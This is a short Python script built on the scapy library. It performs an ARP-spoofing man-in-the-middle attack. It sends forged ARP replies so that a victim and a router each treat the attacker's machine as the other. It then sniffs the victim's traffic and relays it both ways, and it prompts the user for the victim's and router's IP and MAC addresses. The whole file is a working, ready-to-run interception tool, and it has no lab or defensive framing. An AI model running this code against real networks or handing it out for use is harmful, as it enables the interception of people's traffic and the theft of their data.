from scapy.all import *

def spoofed_arp(psrc, pdst, hwdst):
    packet = Ether()/ARP()
    packet[ARP].op = 2      # ARP Reply
    packet[ARP].hwsrc = get_if_hwaddr(conf.iface)
    packet[ARP].hwdst = hwdst   # Destination MAC
    packet[ARP].psrc = psrc     # Source IP
    packet[ARP].pdst = pdst     # Destination IP
    packet[Ether].dst = hwdst   
    packet[Ether].src = get_if_hwaddr(conf.iface)
    return packet

# Listen for incoming and outgoing packets and forward them
def route(packet, pvictim, hwvictim, hwrouter):
    if IP in packet:
        # OUTGOING PACKETS
        if packet[IP].src == pvictim and packet[Ether].dst == get_if_hwaddr(conf.iface):
            packet[Ether].src = get_if_hwaddr(conf.iface)
            packet[Ether].dst = hwrouter
            sendp(packet,verbose=0)
        # INCOMING PACKETS
        elif packet[IP].dst == pvictim and packet[Ether].src == hwrouter:
            packet[Ether].src = get_if_hwaddr(conf.iface)
            packet[Ether].dst = hwvictim
            sendp(packet,verbose=0)

def mitm_router(pvictim, hwvictim, hwrouter):
    # Run each live packet through the route function
    sniff(iface=conf.iface, prn=lambda packet:route(packet, pvictim, hwvictim, hwrouter))

def mitm(pvictim, hwvictim, prouter, hwrouter):
    # Convert all MAC addresses to lowercase to keep consistency
    hwvictim,hwrouter = hwvictim.lower(),hwrouter.lower()
    sendp(spoofed_arp(prouter, pvictim, hwvictim))
    sendp(spoofed_arp(pvictim, prouter, hwrouter))
    mitm_router(pvictim, hwvictim, hwrouter)

if __name__ == '__main__':
    mitm(input('Victim IP: '), input('Victim MAC: '), input('Router IP: '), input('Router MAC: '))
